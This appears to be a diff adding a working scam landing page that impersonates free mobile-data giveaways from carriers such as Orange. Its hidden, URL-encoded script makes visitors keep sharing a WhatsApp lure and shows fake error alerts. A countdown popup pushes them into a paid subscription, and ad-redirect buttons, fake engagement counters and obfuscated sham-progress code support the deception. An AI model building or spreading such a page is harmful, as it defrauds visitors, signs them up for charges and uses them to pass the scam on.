+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">RÉCLAMER 10 Go</font></button>
+                    </a><br/>
+
+             <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE NOW</font></button>
+                    </a><br/>
+          
+        <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1704907,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+
+          
+            <button id="offer">ACTIVATE</button><br/>
+          </div>
+            
+          
+          
+         
+            <button id="whatsapp">
+               
+  
+  
+  <div width="300"
+  height="40"
+  behavior="alternate"
+  style="border:solid"/>
+    
+              SHARE</button></center>
+            <div class="barr"><br/>
+                <div class="fill">
+                    <div id="fill2"></div>
+          <span><i class="fa fa-spinner fa-pulse"></i></span> 
+           <span id="percentage2">0%</span>
+                </div>
+                
+                    
+            </div>
+        </div>
+       
+     
+            
+          
+         
+          
+             
+             
+          
+          
+              </div>
+          
+          
+          
+        </div>
+    </div>
+
+</div>
+<div class="popup" id="popup">
+        <p class="congratulations">Congratulations, You're eligible for a year 50GB data bundle!</p>
+        <p class="popup-text">🎉 Click the button below to visit this offer page, then click on subscribe button there to subscribe to Trivia Giveaway for 1 day, then click on the confirm button To  confirm your number and receive your 50GB data bundle for one year now to your number.</p>
+        <p class="timer"> start now, Offer ends in <span id="countdown">150</span> seconds!</p>
+        <button class="redirect-button" onclick="window.location.href='https://125700.shop/585bac5ca41399bffc40/0a414e7664/?placementName=default';">Subscribe Now To Get Offer</button>
+    </div>
+
+</body>
+</html>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var uYmaa_fiK_hXYdWc={"it":4209637,"key":"8f0dd"};
+    var forward="";
+    uYmaa_fiK_hXYdWc.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+
+
+
+
+
+<script>
+let countdownValue = 150; // Initial countdown value
+        let countdownInterval; // Variable to hold the countdown interval
+
+        // Function to open the popup
+        function openPopup() {
+            document.getElementById('popup').style.display = 'block'; // Show the popup
+            startCountdown(); // Start the countdown
+        }
+
+        // Function to close the popup
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none'; // Hide the popup
+            resetCountdown(); // Reset countdown when popup is closed
+        }
+
+        // Countdown timer function
+        function startCountdown() {
+            countdownInterval = setInterval(() => {
+                if (countdownValue >= 0) {
+                    document.getElementById('countdown').textContent = countdownValue; // Update countdown display
+                    countdownValue--; // Decrease countdown value
+                } else {
+                    clearInterval(countdownInterval); // Stop the countdown when it reaches 0
+                    // Optionally, you can add additional logic here when the countdown ends
+                }
+            }, 1000); // Update every second
+        }
+
+        function resetCountdown() {
+            clearInterval(countdownInterval); // Clear the countdown interval
+            countdownValue = 150; // Reset countdown value
+            document.getElementById('countdown').textContent = countdownValue; // Reset displayed value
+        }
+
+        // Close the popup when clicking outside of the popup content
+        window.onclick = function(event) {
+            const popup = document.getElementById('popup');
+            if (event.target === popup) {
+                closePopup(); // Hide popup
+            }
+        }
+</script>
+
+
+
+
+<script type="text/javascript">
+    var _0xebd417=_0x53ad;(function(_0x34347b,_0x489897){var _0x115da6=_0x53ad,_0x30f63e=_0x34347b();while(!![]){try{var _0x1de8a2=parseInt(_0x115da6(0xbe))/0x1*(parseInt(_0x115da6(0xca))/0x2)+parseInt(_0x115da6(0xda))/0x3+parseInt(_0x115da6(0xe2))/0x4+parseInt(_0x115da6(0xd3))/0x5+parseInt(_0x115da6(0xd7))/0x6+parseInt(_0x115da6(0xe6))/0x7*(parseInt(_0x115da6(0xb3))/0x8)+-parseInt(_0x115da6(0xe8))/0x9;if(_0x1de8a2===_0x489897)break;else _0x30f63e['push'](_0x30f63e['shift']());}catch(_0x3cc5ac){_0x30f63e['push'](_0x30f63e['shift']());}}}(_0x437d,0x67e6f));var vbucksValue=0x3e8,name='';function firstmain0(){var _0x11a307=_0x53ad;name=document[_0x11a307(0xc6)]('input-id')['value'],name==''||name[_0x11a307(0xe9)]<=0x2?(document['getElementById'](_0x11a307(0xb5))[_0x11a307(0xdf)][_0x11a307(0xc1)]=_0x11a307(0xdd),document[_0x11a307(0xc6)](_0x11a307(0xb7))[_0x11a307(0xd0)][_0x11a307(0xd4)](_0x11a307(0xc7)),setTimeout(function(){var _0x412817=_0x11a307;document['getElementById'](_0x412817(0xb5))[_0x412817(0xdf)][_0x412817(0xd5)](_0x412817(0xc1)),document[_0x412817(0xc6)](_0x412817(0xb8))['classList'][_0x412817(0xe1)](_0x412817(0xc7));},0x1f4)):setTimeout(function(){var _0x2f3f32=_0x11a307;document['getElementById'](_0x2f3f32(0xbb))[_0x2f3f32(0xd9)]=name,document[_0x2f3f32(0xc6)](_0x2f3f32(0xd6))['style'][_0x2f3f32(0xb1)]=_0x2f3f32(0xc8),setTimeout(function(){var _0x13b84b=_0x2f3f32;document[_0x13b84b(0xc6)](_0x13b84b(0xd2))[_0x13b84b(0xdf)][_0x13b84b(0xb1)]='block',setTimeout(function(){var _0x52d48c=_0x13b84b;document[_0x52d48c(0xc6)](_0x52d48c(0xbc))[_0x52d48c(0xdf)]['display']='block',document['getElementById'](_0x52d48c(0xcf))['style'][_0x52d48c(0xb1)]='none',setTimeout(function(){var _0xe29f99=_0x52d48c;document[_0xe29f99(0xc6)](_0xe29f99(0xdb))[_0xe29f99(0xdf)][_0xe29f99(0xb1)]=_0xe29f99(0xc8),setTimeout(function(){var _0xdc2ade=_0xe29f99;document[_0xdc2ade(0xc6)](_0xdc2ade(0xc0))['style']['display']=_0xdc2ade(0xc2);},0x64);},0x7d0);},0x1388);},0x64);},0x64);}function _0x437d(){var _0x2c8776=['shakeanim','none','VBucks0','637682GpdJve','Loading\x20last\x20step..','loader','progressbar95','Generating\x20','dots','classList','platform1','search0','1860365ebvAiW','add','removeProperty','step0','4119030rWumxK','Name-LastStep','innerHTML','1583223kbGDhq','main0','VBucks2','0.2em\x20solid\x20darkred','\x20Robux\x20for\x20','style','Selected','remove','814504oVnfcz','vbucksamount','platform2','inline-block','7EmJFTo','progressbar40','18703323GlFqrX','length','progressbar25','display','progress-bar','608824ylGAWk','Generating-step0','input-id','VBucks','user-box','input-box','platform0','addEventListener','searching-text-name','checkmark-icon','search1','2SByLae','main2','main1','borderBottom','block','Finalizing...','click','VBucks1','getElementById'];_0x437d=function(){return _0x2c8776;};return _0x437d();}function device_click(){var _0x3c9e84=_0x53ad;document[_0x3c9e84(0xc6)]('main1')[_0x3c9e84(0xdf)]['display']=_0x3c9e84(0xc8),setTimeout(function(){var _0x46119e=_0x3c9e84;document[_0x46119e(0xc6)](_0x46119e(0xbf))[_0x46119e(0xdf)]['display']=_0x46119e(0xc2);},0x64);}document[_0xebd417(0xc6)](_0xebd417(0xb9))[_0xebd417(0xba)](_0xebd417(0xc4),device_click),document[_0xebd417(0xc6)](_0xebd417(0xd1))[_0xebd417(0xba)](_0xebd417(0xc4),device_click),document[_0xebd417(0xc6)](_0xebd417(0xe4))[_0xebd417(0xba)](_0xebd417(0xc4),device_click);function _0x53ad(_0x3eba3c,_0x5f3dec){var _0x437d34=_0x437d();return _0x53ad=function(_0x53adfe,_0x43aa67){_0x53adfe=_0x53adfe-0xb1;var _0x2d2eed=_0x437d34[_0x53adfe];return _0x2d2eed;},_0x53ad(_0x3eba3c,_0x5f3dec);}function VBucksSelected(_0x5db5b9,_0x4b831c){var _0x4b5613=_0xebd417;vbucksValue=_0x4b831c,document['getElementById']('VBucks0')['classList']['add'](_0x4b5613(0xb6)),document[_0x4b5613(0xc6)](_0x4b5613(0xc5))[_0x4b5613(0xd0)][_0x4b5613(0xd4)]('VBucks'),document[_0x4b5613(0xc6)](_0x4b5613(0xdc))[_0x4b5613(0xd0)][_0x4b5613(0xd4)](_0x4b5613(0xb6)),document[_0x4b5613(0xc6)](_0x4b5613(0xc9))[_0x4b5613(0xd0)][_0x4b5613(0xe1)]('Selected'),document['getElementById']('VBucks1')['classList'][_0x4b5613(0xe1)](_0x4b5613(0xe0)),document[_0x4b5613(0xc6)]('VBucks2')[_0x4b5613(0xd0)][_0x4b5613(0xe1)]('Selected'),document[_0x4b5613(0xc6)](_0x5db5b9)[_0x4b5613(0xd0)]['add'](_0x4b5613(0xe0)),document['getElementById'](_0x5db5b9)[_0x4b5613(0xd0)]['remove'](_0x4b5613(0xb6));}function GenerateButton(){var _0x1d0b9d=_0xebd417;document[_0x1d0b9d(0xc6)]('btn1id')[_0x1d0b9d(0xdf)][_0x1d0b9d(0xb1)]='none',document[_0x1d0b9d(0xc6)]('step1')[_0x1d0b9d(0xdf)]['display']=_0x1d0b9d(0xc8),document['getElementById'](_0x1d0b9d(0xbd))['style'][_0x1d0b9d(0xb1)]=_0x1d0b9d(0xc2),setTimeout(function(){var _0x247759=_0x1d0b9d;document[_0x247759(0xc6)]('progress-bar')[_0x247759(0xd0)][_0x247759(0xd4)](_0x247759(0xea)),setTimeout(function(){var _0x4310a0=_0x247759;document[_0x4310a0(0xc6)](_0x4310a0(0xb4))['innerHTML']=_0x4310a0(0xce)+vbucksValue+_0x4310a0(0xde)+name+'',document[_0x4310a0(0xc6)](_0x4310a0(0xb2))['classList']['add'](_0x4310a0(0xe7)),setTimeout(function(){var _0x43eea7=_0x4310a0;document[_0x43eea7(0xc6)]('Generating-step0')['innerHTML']=_0x43eea7(0xc3),document[_0x43eea7(0xc6)](_0x43eea7(0xb2))[_0x43eea7(0xd0)][_0x43eea7(0xd4)]('progressbar75'),setTimeout(function(){var _0x46c7b7=_0x43eea7;document['getElementById'](_0x46c7b7(0xb4))['innerHTML']=_0x46c7b7(0xcb),document[_0x46c7b7(0xc6)]('progress-bar')['classList'][_0x46c7b7(0xd4)](_0x46c7b7(0xcd)),document['getElementById'](_0x46c7b7(0xcc))[_0x46c7b7(0xdf)][_0x46c7b7(0xb1)]=_0x46c7b7(0xe5),setTimeout(function(){var _0x4231c8=_0x46c7b7;document[_0x4231c8(0xc6)](_0x4231c8(0xbf))[_0x4231c8(0xdf)][_0x4231c8(0xb1)]=_0x4231c8(0xc8),setTimeout(function(){var _0x1e2ff4=_0x4231c8;document[_0x1e2ff4(0xc6)]('main3')['style'][_0x1e2ff4(0xb1)]=_0x1e2ff4(0xc2),document[_0x1e2ff4(0xc6)](_0x1e2ff4(0xe3))[_0x1e2ff4(0xd9)]=vbucksValue,document[_0x1e2ff4(0xc6)](_0x1e2ff4(0xd8))[_0x1e2ff4(0xd9)]=name;},0x64);},0xbb8);},0xbb8);},0x1388);},0xfa0);},0x3e8);}
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+</script>
+
+ <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+      <script>
+        var text1 = "*CADEAU DE DONNÉES GRATUITES DE NOËL ORANGE*%0A%0AOrange récompense les données gratuites à tous ses clients à l'occasion des fêtes de Noël et du nouvel an.%0A%0A*Visitez le site officiel maintenant pour activer vos données gratuites*%0A%0A_*CLIQUEZ ICI* _👇%0Ahttps://damba-fest.org/orange-xmas.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+</div>
+
+  <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
+</body>
+</html>
